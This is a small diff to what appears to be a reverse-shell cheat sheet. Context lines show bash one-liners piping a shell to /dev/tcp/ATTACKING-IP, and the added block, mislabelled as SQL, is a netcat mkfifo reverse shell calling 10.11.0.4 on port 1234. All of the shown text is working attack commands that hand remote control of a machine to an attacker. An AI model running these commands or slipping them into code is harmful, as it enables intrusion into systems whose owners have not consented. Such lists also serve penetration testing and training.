@@ -173,6 +173,10 @@ exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; d
 bash -i >& /dev/tcp/ATTACKING-IP/80 0>&
 ```
 
+```sql
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
+```
+
 
 ## **Perl**
 
